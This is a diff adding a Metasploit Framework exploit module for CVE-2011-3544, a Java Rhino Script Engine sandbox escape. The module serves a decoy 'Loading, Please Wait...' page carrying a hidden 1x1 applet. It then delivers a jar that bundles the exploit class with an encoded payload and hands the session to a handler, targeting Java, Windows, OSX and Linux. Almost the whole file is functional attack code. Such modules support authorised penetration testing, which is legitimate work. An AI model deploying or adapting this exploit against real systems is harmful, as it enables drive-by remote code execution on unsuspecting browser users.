@@ -1,0 +1,122 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'rex'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+
+	def initialize( info = {} )
+		super( update_info( info,
+			'Name'          => 'Java Applet Rhino Script Engine Remote Code Execution',
+			'Description'   => %q{
+					This module exploits a vulnerability in the Rhino Script Engine that
+				can be used by a Java Applet to run arbitrary Java code outside of
+				the sandbox.  The vulnerability affects version 7 and version 6 update
+				27 and earlier, and should work on any browser that supports Java
+				(for example: IE, Firefox, Google Chrome, etc)
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        =>
+				[
+					'Michael Schierl', # Discovery
+					'juan vazquez',    # metasploit module
+					'Edward D. Teach <teach@consortium-of-pwners.net>',
+					'sinn3r'
+				],
+			'References'    =>
+				[
+					[ 'CVE', '2011-3544' ],
+					[ 'OSVDB', '76500' ], # 76500 and 76499 have contents mixed
+					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-305/' ],
+					[ 'URL', 'http://schierlm.users.sourceforge.net/CVE-2011-3544.html' ],
+				],
+			'Platform'      => [ 'java', 'win', 'linux' ],
+			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
+			'Targets'       =>
+				[
+					[ 'Generic (Java Payload)',
+						{
+							'Arch' => ARCH_JAVA,
+						}
+					],
+					[ 'Windows Universal',
+						{
+							'Arch' => ARCH_X86,
+							'Platform' => 'win'
+						}
+					],
+					[ 'Apple OSX',
+						{
+							'ARCH' => ARCH_X86,
+							'Platform' => 'osx'
+						}
+					],
+					[ 'Linux x86',
+						{
+							'Arch' => ARCH_X86,
+							'Platform' => 'linux'
+						}
+					]
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Oct 18 2011'
+			))
+	end
+
+
+	def on_request_uri( cli, request )
+		if not request.uri.match(/\.jar$/i)
+			if not request.uri.match(/\/$/)
+				send_redirect(cli, get_resource() + '/', '')
+				return
+			end
+
+			print_status("#{self.name} handling request from #{cli.peerhost}:#{cli.peerport}...")
+
+			send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )
+			return
+		end
+
+		paths = [
+			[ "Exploit.class" ]
+		]
+
+		p = regenerate_payload(cli)
+
+		jar  = p.encoded_jar
+		paths.each do |path|
+			1.upto(path.length - 1) do |idx|
+				full = path[0,idx].join("/") + "/"
+				if !(jar.entries.map{|e|e.name}.include?(full))
+					jar.add_file(full, '')
+				end
+			end
+			fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "cve-2011-3544", path ), "rb")
+			data = fd.read(fd.stat.size)
+			jar.add_file(path.join("/"), data)
+			fd.close
+		end
+
+		print_status( "Sending Applet.jar to #{cli.peerhost}:#{cli.peerport}..." )
+		send_response( cli, jar.pack, { 'Content-Type' => "application/octet-stream" } )
+
+		handler( cli )
+	end
+
+	def generate_html
+		html  = "<html><head><title>Loading, Please Wait...</title></head>"
+		html += "<body><center><p>Loading, Please Wait...</p></center>"
+		html += "<applet archive=\"Exploit.jar\" code=\"Exploit.class\" width=\"1\" height=\"1\">"
+		html += "</applet></body></html>"
+		return html
+	end
+
+end
